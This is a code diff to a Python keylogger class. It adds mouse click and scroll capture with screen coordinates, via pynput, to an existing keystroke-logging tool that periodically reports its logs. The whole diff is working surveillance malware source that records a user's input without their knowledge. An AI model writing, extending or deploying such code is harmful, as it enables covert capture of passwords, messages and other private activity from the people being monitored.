@@ -1,4 +1,5 @@
 import keyboard # for keylogs
+from pynput import mouse # for mouse event capture
 from threading import Timer
 from datetime import datetime
 
@@ -16,6 +17,7 @@ class Keylogger:
         # record start & end datetimes
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
+        self.listener = mouse.Listener(on_click=self.on_click, on_scroll=self.on_scroll)
 
     def callback(self, event):
         """
@@ -39,6 +41,15 @@ class Keylogger:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
         # finally, add the key name to our global `self.log` variable
+        self.log += name
+
+    def on_click(self, x, y, button, pressed):
+        btn = str(button).split('.')[1].capitalize()
+        name = f"[{btn}_{'Down'if pressed else 'Up'}({x}, {y})]"
+        self.log += name
+
+    def on_scroll(self, x, y, dx, dy):
+        name = f"[Scroll_{'Down'if dy < 0 else 'Up'}({x}, {y})]"
         self.log += name
     
     def update_filename(self):
@@ -85,6 +96,8 @@ class Keylogger:
         keyboard.on_release(callback=self.callback)
         # start reporting the keylogs
         self.report()
+        # start mouse event listener
+        self.listener.start()
         # make a simple message
         print(f"{datetime.now()} - Started keylogger")
         # block the current thread, wait until CTRL+C is pressed
